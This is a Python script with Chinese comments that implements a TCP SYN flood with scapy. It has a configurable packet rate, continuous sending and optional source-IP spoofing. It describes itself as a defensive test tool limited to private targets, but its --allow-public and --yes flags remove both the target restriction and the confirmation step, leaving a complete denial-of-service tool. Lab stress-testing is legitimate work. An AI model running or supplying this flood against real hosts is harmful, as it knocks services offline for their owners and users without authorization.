#!/usr/bin/env python3
"""
tcp_syn_flood_test.py

轻量的 TCP SYN 泛洪模拟脚本（仅用于防御/测试目的）。
- 强制要求目标为私有/本地网段，除非显式允许 --allow-public。
- 需要 root 权限来发送伪造源地址的原始包。
- 发送前会二次确认（除非使用 --yes）。

注意：不要在公共互联网或未授权主机上运行此脚本。仅在你完全控制的测试环境/虚拟机中使用。
"""

import argparse
import random
import time
import sys
import ipaddress

try:
    from scapy.all import IP, TCP, send
except Exception as e:
    print("错误：未能导入 scapy。请使用 `pip install scapy` 并以 root 权限运行脚本。")
    sys.exit(1)


def random_private_ip():
    # 生成随机私有 IPv4（10/8, 172.16/12, 192.168/16）
    choice = random.choice([0, 1, 2])
    if choice == 0:
        return f"10.{random.randrange(0,256)}.{random.randrange(0,256)}.{random.randrange(1,255)}"
    elif choice == 1:
        return f"172.{random.randrange(16,32)}.{random.randrange(0,256)}.{random.randrange(1,255)}"
    else:
        return f"192.168.{random.randrange(0,256)}.{random.randrange(1,255)}"


def random_ipv4():
    return f"{random.randrange(1,255)}.{random.randrange(0,256)}.{random.randrange(0,256)}.{random.randrange(1,255)}"


def is_allowed_target(addr, allow_public=False):
    ip = ipaddress.ip_address(addr)
    # 允许私有、回环、链路本地
    if ip.is_private or ip.is_loopback or ip.is_link_local:
        return True
    return allow_public


def main():
    p = argparse.ArgumentParser(description='SYN flood模拟（仅限测试环境）')
    p.add_argument('-t', '--target', required=True, help='目标 IP')
    p.add_argument('-p', '--port', type=int, default=80, help='目标 TCP 端口')
    p.add_argument('-n', '--count', type=int, default=1000, help='发送包数量，0 表示持续发送')
    p.add_argument('--pps', type=int, default=1000, help='发送速率 (packets per second)')
    p.add_argument('--spoof', action='store_true', help='伪造源 IP（需要 root）')
    p.add_argument('--allow-public', action='store_true', help='允许对公共 IP 进行测试（危险）')
    p.add_argument('-i', '--iface', default=None, help='发送所用接口（可选）')
    p.add_argument('--yes', action='store_true', help='跳过交互式确认')
    args = p.parse_args()

    try:
        ipaddress.ip_address(args.target)
    except Exception:
        print('无效的目标 IP')
        sys.exit(1)

    if not is_allowed_target(args.target, allow_public=args.allow_public):
        print('\n警告：目标 IP 不是私有或本地地址。默认脚本阻止对公共目标的攻击。')
        print('如果你确实要对公共 IP 进行测试，请使用 --allow-public 标志并确认你有授权。')
        sys.exit(1)

    if not args.yes:
        print(f"准备向 {args.target}:{args.port} 发送 SYN 包")
        print("仅在你完全控制并授权的测试环境（例如 VM）中运行。")
        confirm = input("继续请键入 YES：")
        if confirm.strip() != 'YES':
            print('已取消')
            sys.exit(0)

    if args.pps <= 0:
        args.pps = 1000

    delay = 1.0 / args.pps

    sent = 0
    start = time.time()
    try:
        while True:
            if args.count > 0 and sent >= args.count:
                break

            if args.spoof:
                src = random_private_ip()
            else:
                src = None  # 让内核选择源地址

            sport = random.randrange(1024, 65535)
            seq = random.getrandbits(32)

            if src:
                pkt = IP(src=src, dst=args.target) / TCP(sport=sport, dport=args.port, flags='S', seq=seq)
            else:
                pkt = IP(dst=args.target) / TCP(sport=sport, dport=args.port, flags='S', seq=seq)

            # 发送包（L3）
            send(pkt, iface=args.iface, verbose=False)

            sent += 1
            if delay > 0:
                time.sleep(delay)

    except KeyboardInterrupt:
        print('\n已中断')

    elapsed = time.time() - start
    print(f"已发送 {sent} 个 SYN 包，耗时 {elapsed:.2f} 秒")


if __name__ == '__main__':
    main()
